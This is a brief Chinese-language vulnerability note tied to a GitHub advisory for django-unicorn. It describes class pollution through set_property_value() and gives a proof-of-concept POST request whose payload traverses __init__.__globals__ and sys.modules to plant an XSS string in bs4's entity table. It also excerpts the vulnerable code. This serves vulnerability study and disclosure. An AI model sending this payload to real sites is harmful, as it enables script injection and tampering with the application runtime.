https://github.com/advisories/GHSA-g9wf-5777-gq43
tpl:
 django-unicorn


vul func:
set_property_value() (位于django_unicorn/views/action_parsers/utils.py)


漏洞触发条件:
攻击者可构造恶意HTTP请求，控制property_name和property_value参数
通过__init__.__globals__等魔法属性遍历Python运行时环境
目标系统使用Django-Unicorn组件且未升级到安全版本

PoC代码片段:
# 基础攻击请求结构
POST /unicorn/message/COMPONENT_NAME HTTP/1.1
{
    "actionQueue": [{
        "type": "syncInput",
        "payload": {
            "name": "__init__.__globals__.sys.modules.bs4.dammit.EntitySubstitution.CHARACTER_TO_XML_ENTITY.<",
            "value": "<img/src=1 onerror=alert(1)>"
        }
    }],
    "data": {}
}

# 关键漏洞利用点（utils.py）
def set_property_value(component, property_name, property_value):
    property_name_parts = property_name.split(".")  # 可控点1：属性链拆分
    for part in property_name_parts:
        if hasattr(component_or_field, part):
            setattr(component_or_field, part, property_value)  # 可控点2：属性注入
        # ...其他分支处理...
